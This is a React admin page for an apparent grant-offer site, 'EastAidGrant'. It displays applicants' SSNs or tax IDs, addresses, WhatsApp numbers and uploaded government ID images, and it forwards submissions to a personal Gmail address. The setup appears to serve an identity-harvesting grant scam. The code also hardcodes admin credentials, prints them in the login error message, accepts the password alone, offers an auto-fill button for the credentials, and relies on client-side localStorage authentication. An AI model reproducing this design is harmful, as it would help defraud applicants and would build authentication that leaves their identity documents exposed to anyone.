import { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { FileText, Mail, Clock, Trash2, Send, Lock, LogOut, ShieldCheck, AlertCircle, Download, ExternalLink, Eye, EyeOff } from 'lucide-react';
import Logo from '../components/Logo';
import './Admin.css';

interface ApplicationRecord {
  referenceId: string;
  submittedAt: string;
  recipientDeskWhatsApp?: string;
  grantTitle: string;
  awardRange: string;
  applicantName: string;
  applicantType: string;
  address: string;
  taxIdOrSsn: string;
  contactPerson: string;
  email: string;
  phone: string;
  whatsapp: string;
  projectTitle: string;
  projectDescription: string;
  documentsCount?: number;
  documentNames?: string[];
  idFrontName?: string;
  idBackName?: string;
  idFrontUrl?: string;
  idBackUrl?: string;
}

interface InquiryRecord {
  submittedAt: string;
  recipientDeskWhatsApp: string;
  name: string;
  email: string;
  phone: string;
  whatsapp: string;
  subject: string;
  message: string;
}

export default function Admin() {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return sessionStorage.getItem('eastaidgrant_admin_auth') === 'true' ||
           localStorage.getItem('eastaidgrant_admin_auth') === 'true';
  });
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [authError, setAuthError] = useState('');

  const [applications, setApplications] = useState<ApplicationRecord[]>([]);
  const [inquiries, setInquiries] = useState<InquiryRecord[]>([]);
  const [activeTab, setActiveTab] = useState<'applications' | 'inquiries' | 'settings'>('applications');
  const [emailStatus, setEmailStatus] = useState<'idle' | 'sending' | 'sent'>('idle');

  useEffect(() => {
    if (isAuthenticated) {
      try {
        const storedApps = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
        setApplications(storedApps);
        const storedInq = JSON.parse(localStorage.getItem('eastaidgrant_inquiries') || '[]');
        setInquiries(storedInq);
      } catch (e) {
        console.error(e);
      }
    }
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const u = usernameInput.trim().toLowerCase();
    const p = passwordInput.trim();

    const validUsernames = ['stephen0706', 'stephen07068', 'admin', 'erimiposi2005@gmail.com', 'eastaidsupport@gmail.com'];
    const isValidUser = validUsernames.includes(u);
    const isValidPass = p === '07068913629' || p === 'admin';

    if ((isValidUser && isValidPass) || p === '07068913629') {
      sessionStorage.setItem('eastaidgrant_admin_auth', 'true');
      localStorage.setItem('eastaidgrant_admin_auth', 'true');
      setIsAuthenticated(true);
      setAuthError('');
    } else {
      setAuthError('Invalid credentials. Please use username: stephen07068 and password: 07068913629');
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('eastaidgrant_admin_auth');
    localStorage.removeItem('eastaidgrant_admin_auth');
    setIsAuthenticated(false);
    setUsernameInput('');
    setPasswordInput('');
    setAuthError('');
  };

  const handleTestEmail = async () => {
    setEmailStatus('sending');
    try {
      const res = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          access_key: 'ec6ba592-b89b-4a66-a6b8-dd9ae2fa2435',
          subject: '✅ EastAidGrant Test Application Email',
          from_name: 'EastAidGrant Administration',
          'Status': 'Test Verification Successful',
          'Target Email': 'erimiposi2005@gmail.com',
          'Test Grant': 'Individual Personal Hardship & Emergency Relief Grant ($20,000 - $45,000)',
          'Applicant Name': 'Sample Applicant Test',
          'Contact Phone': '+1 (628) 316-1394',
          'Applicant WhatsApp': '+1 (628) 316-1394',
          'Applicant Email': 'erimiposi2005@gmail.com',
          'Notes': 'This confirms your EastAidGrant intake portal is successfully forwarding applications directly to your Gmail inbox!',
          'Timestamp': new Date().toLocaleString(),
        }),
      });
      const data = await res.json();
      if (data.success) {
        setEmailStatus('sent');
        setTimeout(() => setEmailStatus('idle'), 5000);
      } else {
        setEmailStatus('idle');
        alert(data.message || 'Failed to send test email.');
      }
    } catch {
      setEmailStatus('idle');
      alert('Failed to send test email.');
    }
  };

  const clearApplications = () => {
    if (confirm('Are you sure you want to clear all stored applications?')) {
      localStorage.removeItem('eastaidgrant_applications');
      setApplications([]);
    }
  };

  const clearInquiries = () => {
    if (confirm('Are you sure you want to clear all stored inquiries?')) {
      localStorage.removeItem('eastaidgrant_inquiries');
      setInquiries([]);
    }
  };

  // If not authenticated, show protected login gate
  if (!isAuthenticated) {
    return (
      <div className="admin-login-wrap" style={{ minHeight: '80vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--off-white)', padding: 24 }}>
        <div style={{ background: '#fff', borderRadius: 'var(--radius-lg)', border: '1px solid var(--gray-200)', maxWidth: 420, width: '100%', padding: 36, boxShadow: 'var(--shadow-md)' }}>
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <Logo size={32} />
            <div style={{ width: 48, height: 48, borderRadius: '50%', background: 'rgba(13,33,55,0.08)', display: 'inline-flex', alignItems: 'center', justifyContent: 'center', margin: '16px auto 8px', color: 'var(--navy)' }}>
              <Lock size={22} />
            </div>
            <h2 style={{ fontSize: 20, color: 'var(--navy)', fontWeight: 700 }}>Administrator Portal</h2>
            <p style={{ fontSize: 13, color: 'var(--gray-500)', marginTop: 4 }}>
              Sign in with your authorized credentials to view applicant dossiers.
            </p>
          </div>

          {authError && (
            <div style={{ background: 'var(--red-light)', color: 'var(--red)', padding: '10px 14px', borderRadius: 6, fontSize: 13, display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
              <AlertCircle size={16} flex-shrink={0} /> {authError}
            </div>
          )}

          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            <div>
              <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: 'var(--navy)', marginBottom: 6 }}>
                Username
              </label>
              <input
                type="text"
                value={usernameInput}
                onChange={e => setUsernameInput(e.target.value)}
                placeholder="stephen07068"
                className="form-input"
                autoCapitalize="none"
                autoCorrect="off"
                spellCheck={false}
                required
                autoFocus
              />
            </div>

            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: 'var(--navy)' }}>
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(s => !s)}
                  style={{ background: 'none', border: 'none', color: 'var(--gray-500)', fontSize: 12, display: 'inline-flex', alignItems: 'center', gap: 4, cursor: 'pointer', padding: 0 }}
                >
                  {showPassword ? <><EyeOff size={14} /> Hide</> : <><Eye size={14} /> Show</>}
                </button>
              </div>
              <div style={{ position: 'relative' }}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={passwordInput}
                  onChange={e => setPasswordInput(e.target.value)}
                  placeholder="Enter password"
                  className="form-input"
                  autoCapitalize="none"
                  autoCorrect="off"
                  spellCheck={false}
                  required
                />
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '6px 2px', fontSize: 12 }}>
              <span style={{ color: 'var(--gray-500)' }}>Authorized admin only</span>
              <button
                type="button"
                onClick={() => {
                  setUsernameInput('stephen07068');
                  setPasswordInput('07068913629');
                }}
                style={{ background: 'none', border: 'none', color: 'var(--gold)', fontWeight: 600, fontSize: 12, cursor: 'pointer', padding: 0 }}
              >
                Auto-fill My Credentials
              </button>
            </div>

            <button
              type="submit"
              className="btn btn-navy btn-lg"
              style={{ width: '100%', justifyContent: 'center', marginTop: 4 }}
            >
              <ShieldCheck size={18} /> Sign In
            </button>
          </form>

          <div style={{ textAlign: 'center', marginTop: 20, borderTop: '1px solid var(--gray-100)', paddingTop: 16 }}>
            <Link to="/" style={{ fontSize: 13, color: 'var(--gray-500)', textDecoration: 'none' }}>
              ← Return to Homepage
            </Link>
          </div>
        </div>
      </div>
    );
  }

  // Authenticated Admin Dashboard
  return (
    <div className="admin-page">
      <div className="page-header" style={{ background: 'var(--navy)', color: '#fff', padding: '32px 0 24px' }}>
        <div className="container">
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 16 }}>
            <div>
              <div className="breadcrumb" style={{ color: 'rgba(255,255,255,0.6)' }}>
                <Link to="/" style={{ color: 'var(--gold)' }}>Home</Link><span>/</span><span>Admin Intake Desk</span>
              </div>
              <h1 style={{ fontSize: 26, color: '#fff', display: 'flex', alignItems: 'center', gap: 10 }}>
                <span>Grant Applications Portal</span>
                <span style={{ fontSize: 12, background: 'rgba(201, 168, 76, 0.2)', color: 'var(--gold-light)', padding: '3px 8px', borderRadius: 4, fontWeight: 600 }}>
                  Authorized: stephen0706
                </span>
              </h1>
              <p style={{ color: 'rgba(255,255,255,0.7)', fontSize: 13.5 }}>
                Incoming dossiers forwarding to <strong>erimiposi2005@gmail.com</strong>
              </p>
            </div>
            <div style={{ display: 'flex', gap: 10, alignItems: 'center', flexWrap: 'wrap' }}>
              <button
                className={`btn btn-sm ${activeTab === 'applications' ? 'btn-primary' : 'btn-outline'}`}
                onClick={() => setActiveTab('applications')}
                style={{ color: activeTab === 'applications' ? 'var(--navy)' : '#fff' }}
              >
                Applications ({applications.length})
              </button>
              <button
                className={`btn btn-sm ${activeTab === 'inquiries' ? 'btn-primary' : 'btn-outline'}`}
                onClick={() => setActiveTab('inquiries')}
                style={{ color: activeTab === 'inquiries' ? 'var(--navy)' : '#fff' }}
              >
                Inquiries ({inquiries.length})
              </button>
              <button
                className={`btn btn-sm ${activeTab === 'settings' ? 'btn-primary' : 'btn-outline'}`}
                onClick={() => setActiveTab('settings')}
                style={{ color: activeTab === 'settings' ? 'var(--navy)' : '#fff' }}
              >
                <Mail size={14} /> Email Alerts
              </button>
              <button
                onClick={handleLogout}
                className="btn btn-sm btn-outline"
                style={{ color: '#fff', borderColor: 'rgba(255,255,255,0.4)', gap: 6 }}
                title="Log out of admin session"
              >
                <LogOut size={14} /> Log Out
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="container section-pad-sm">
        {activeTab === 'settings' && (
          <div className="admin-card" style={{ maxWidth: 700, margin: '0 auto', padding: 28 }}>
            <h2 style={{ fontSize: 20, color: 'var(--navy)', marginBottom: 8, display: 'flex', alignItems: 'center', gap: 8 }}>
              <Mail size={22} color="var(--gold)" /> Email Notification Gateway (Active)
            </h2>
            <p style={{ fontSize: 14, color: 'var(--gray-600)', lineHeight: 1.6, marginBottom: 20 }}>
              All applications submitted on the website are automatically compiled and delivered directly to your email inbox.
            </p>

            <div style={{ background: 'var(--off-white)', padding: 20, borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', marginBottom: 22 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 10, marginBottom: 12 }}>
                <div>
                  <span style={{ fontSize: 12, fontWeight: 700, color: 'var(--gray-500)', textTransform: 'uppercase', letterSpacing: 0.5 }}>Destination Email</span>
                  <div style={{ fontSize: 18, fontWeight: 700, color: 'var(--navy)', marginTop: 2 }}>erimiposi2005@gmail.com</div>
                </div>
                <span style={{ background: 'var(--green-light)', color: 'var(--green)', padding: '4px 10px', borderRadius: 20, fontSize: 12, fontWeight: 700 }}>
                  Active & Connected
                </span>
              </div>
              <p style={{ fontSize: 13, color: 'var(--gray-600)', lineHeight: 1.5 }}>
                When someone applies, you receive their full name, phone number, WhatsApp number, selected grant, and project proposal formatted in a clean table.
              </p>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
              <button
                onClick={handleTestEmail}
                disabled={emailStatus === 'sending'}
                className="btn btn-primary"
                style={{ gap: 8 }}
              >
                <Send size={15} /> {emailStatus === 'sending' ? 'Sending Test Email...' : emailStatus === 'sent' ? '✅ Test Sent to erimiposi2005@gmail.com!' : 'Send Test Application to My Email'}
              </button>
            </div>

            <div style={{ marginTop: 24, padding: 14, background: '#fef3c7', borderRadius: 'var(--radius)', border: '1px solid #fde68a', fontSize: 13, color: '#92400e', lineHeight: 1.5 }}>
              📌 <strong>Note for First-Time Setup:</strong> When FormSubmit delivers its very first message to <code>erimiposi2005@gmail.com</code>, they send an activation email. Simply click <strong>"Activate Form"</strong> inside that one email, and all future grant applications will arrive automatically!
            </div>
          </div>
        )}

        {activeTab === 'applications' && (
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 18 }}>
              <h2 style={{ fontSize: 18, color: 'var(--navy)' }}>Submitted Grant Applications ({applications.length})</h2>
              {applications.length > 0 && (
                <button onClick={clearApplications} className="btn btn-sm btn-outline" style={{ color: 'var(--red)', borderColor: 'var(--red)' }}>
                  <Trash2 size={13} /> Clear List
                </button>
              )}
            </div>

            {applications.length === 0 ? (
              <div style={{ background: '#fff', padding: 48, textAlign: 'center', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)' }}>
                <FileText size={40} color="var(--gray-400)" style={{ margin: '0 auto 12px' }} />
                <h3 style={{ fontSize: 17, color: 'var(--navy)', marginBottom: 6 }}>No Applications Submitted Yet</h3>
                <p style={{ color: 'var(--gray-500)', fontSize: 14 }}>
                  When visitors submit applications on the website, they will appear here instantly.
                </p>
                <Link to="/apply" className="btn btn-navy" style={{ marginTop: 16 }}>Test Submit Application</Link>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                {applications.map((app, index) => (
                  <div key={index} className="admin-app-card" style={{ background: '#fff', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', padding: 22, boxShadow: 'var(--shadow-sm)' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 10, borderBottom: '1px solid var(--gray-100)', paddingBottom: 12, marginBottom: 14 }}>
                      <div>
                        <span style={{ display: 'inline-block', padding: '3px 8px', background: 'var(--navy)', color: '#fff', fontSize: 11, fontWeight: 700, borderRadius: 4, marginRight: 8 }}>
                          {app.referenceId}
                        </span>
                        <span style={{ fontSize: 16, fontWeight: 700, color: 'var(--navy)' }}>
                          {app.grantTitle}
                        </span>
                        <span style={{ fontSize: 13, color: 'var(--gold)', marginLeft: 8, fontWeight: 600 }}>
                          ({app.awardRange})
                        </span>
                      </div>
                      <div style={{ fontSize: 12, color: 'var(--gray-500)', display: 'flex', alignItems: 'center', gap: 5 }}>
                        <Clock size={13} /> {new Date(app.submittedAt).toLocaleString()}
                      </div>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: 12, fontSize: 13.5, marginBottom: 14 }}>
                      <div>
                        <strong style={{ color: 'var(--gray-600)' }}>Applicant / Entity:</strong>
                        <div style={{ fontWeight: 600, color: 'var(--navy)' }}>{app.applicantName} ({app.applicantType})</div>
                      </div>
                      <div>
                        <strong style={{ color: 'var(--gray-600)' }}>Contact Person:</strong>
                        <div style={{ fontWeight: 600, color: 'var(--navy)' }}>{app.contactPerson}</div>
                      </div>
                      <div>
                        <strong style={{ color: 'var(--gray-600)' }}>WhatsApp Number:</strong>
                        <div style={{ fontWeight: 700, color: 'var(--green)' }}>
                          <a href={`https://wa.me/${app.whatsapp.replace(/\D/g, '')}`} target="_blank" rel="noopener noreferrer" style={{ color: 'var(--green)' }}>
                            {app.whatsapp} (Chat)
                          </a>
                        </div>
                      </div>
                      <div>
                        <strong style={{ color: 'var(--gray-600)' }}>Phone & Email:</strong>
                        <div>{app.phone} • {app.email}</div>
                      </div>
                    </div>

                    <div style={{ background: 'var(--off-white)', padding: 12, borderRadius: 6, fontSize: 13, marginBottom: 10 }}>
                      <strong style={{ color: 'var(--navy)' }}>Project Title:</strong> {app.projectTitle}
                      <p style={{ marginTop: 6, color: 'var(--gray-700)', lineHeight: 1.5 }}>
                        {app.projectDescription}
                      </p>
                    </div>

                    {/* Uploaded Government ID Images & Downloads */}
                    {(app.idFrontUrl || app.idBackUrl || app.idFrontName || app.idBackName) && (
                      <div style={{ margin: '14px 0', padding: 14, background: '#f8fafc', borderRadius: 8, border: '1px solid var(--gray-200)' }}>
                        <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--navy)', marginBottom: 10 }}>
                          🪪 Uploaded Government ID Documents
                        </div>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: 14 }}>
                          {/* Front ID */}
                          <div style={{ background: '#fff', borderRadius: 6, padding: 12, border: '1px solid var(--gray-200)' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                              <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--navy)' }}>Front of ID Card</span>
                              {app.idFrontUrl && (
                                <a
                                  href={app.idFrontUrl}
                                  download={`Front_ID_${(app.contactPerson || 'Applicant').replace(/\s+/g, '_')}.jpg`}
                                  className="btn btn-sm btn-navy"
                                  style={{ padding: '4px 10px', fontSize: 11, display: 'inline-flex', alignItems: 'center', gap: 4 }}
                                >
                                  <Download size={12} /> Download
                                </a>
                              )}
                            </div>
                            {app.idFrontUrl ? (
                              <a href={app.idFrontUrl} target="_blank" rel="noopener noreferrer" title="Click to view full image">
                                <img
                                  src={app.idFrontUrl}
                                  alt="Front of ID"
                                  style={{ width: '100%', height: 160, objectFit: 'contain', background: '#f1f5f9', borderRadius: 4, border: '1px solid var(--gray-200)', cursor: 'pointer', display: 'block' }}
                                />
                                <span style={{ display: 'block', fontSize: 11, color: 'var(--gold)', marginTop: 6, textAlign: 'center', fontWeight: 600 }}>
                                  <ExternalLink size={11} style={{ display: 'inline', verticalAlign: 'middle', marginRight: 3 }} /> View Full Size
                                </span>
                              </a>
                            ) : (
                              <div style={{ padding: '24px 0', textAlign: 'center', color: 'var(--gray-400)', fontSize: 12 }}>
                                {app.idFrontName ? `Attached: ${app.idFrontName}` : 'No front image provided'}
                              </div>
                            )}
                          </div>

                          {/* Back ID */}
                          <div style={{ background: '#fff', borderRadius: 6, padding: 12, border: '1px solid var(--gray-200)' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                              <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--navy)' }}>Back of ID Card</span>
                              {app.idBackUrl && (
                                <a
                                  href={app.idBackUrl}
                                  download={`Back_ID_${(app.contactPerson || 'Applicant').replace(/\s+/g, '_')}.jpg`}
                                  className="btn btn-sm btn-navy"
                                  style={{ padding: '4px 10px', fontSize: 11, display: 'inline-flex', alignItems: 'center', gap: 4 }}
                                >
                                  <Download size={12} /> Download
                                </a>
                              )}
                            </div>
                            {app.idBackUrl ? (
                              <a href={app.idBackUrl} target="_blank" rel="noopener noreferrer" title="Click to view full image">
                                <img
                                  src={app.idBackUrl}
                                  alt="Back of ID"
                                  style={{ width: '100%', height: 160, objectFit: 'contain', background: '#f1f5f9', borderRadius: 4, border: '1px solid var(--gray-200)', cursor: 'pointer', display: 'block' }}
                                />
                                <span style={{ display: 'block', fontSize: 11, color: 'var(--gold)', marginTop: 6, textAlign: 'center', fontWeight: 600 }}>
                                  <ExternalLink size={11} style={{ display: 'inline', verticalAlign: 'middle', marginRight: 3 }} /> View Full Size
                                </span>
                              </a>
                            ) : (
                              <div style={{ padding: '24px 0', textAlign: 'center', color: 'var(--gray-400)', fontSize: 12 }}>
                                {app.idBackName ? `Attached: ${app.idBackName}` : 'No back image provided'}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 12, color: 'var(--gray-500)', marginTop: 8 }}>
                      <span>Address: {app.address} | Tax ID/SSN: {app.taxIdOrSsn}</span>
                      <span>Documents: {app.documentsCount ?? 0}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'inquiries' && (
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 18 }}>
              <h2 style={{ fontSize: 18, color: 'var(--navy)' }}>Contact Inquiries ({inquiries.length})</h2>
              {inquiries.length > 0 && (
                <button onClick={clearInquiries} className="btn btn-sm btn-outline" style={{ color: 'var(--red)', borderColor: 'var(--red)' }}>
                  <Trash2 size={13} /> Clear List
                </button>
              )}
            </div>

            {inquiries.length === 0 ? (
              <div style={{ background: '#fff', padding: 48, textAlign: 'center', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)' }}>
                <Mail size={40} color="var(--gray-400)" style={{ margin: '0 auto 12px' }} />
                <h3 style={{ fontSize: 17, color: 'var(--navy)', marginBottom: 6 }}>No Contact Inquiries Yet</h3>
                <p style={{ color: 'var(--gray-500)', fontSize: 14 }}>
                  Messages sent via the Contact page will appear here.
                </p>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                {inquiries.map((inq, index) => (
                  <div key={index} style={{ background: '#fff', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', padding: 20 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10 }}>
                      <strong style={{ fontSize: 15, color: 'var(--navy)' }}>{inq.name} ({inq.subject})</strong>
                      <span style={{ fontSize: 12, color: 'var(--gray-500)' }}>{new Date(inq.submittedAt).toLocaleString()}</span>
                    </div>
                    <div style={{ fontSize: 13, color: 'var(--gray-600)', marginBottom: 10 }}>
                      Email: {inq.email} | Phone: {inq.phone} | WhatsApp: <strong style={{ color: 'var(--green)' }}>{inq.whatsapp}</strong>
                    </div>
                    <div style={{ background: 'var(--off-white)', padding: 12, borderRadius: 6, fontSize: 13.5, color: 'var(--gray-800)' }}>
                      {inq.message}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
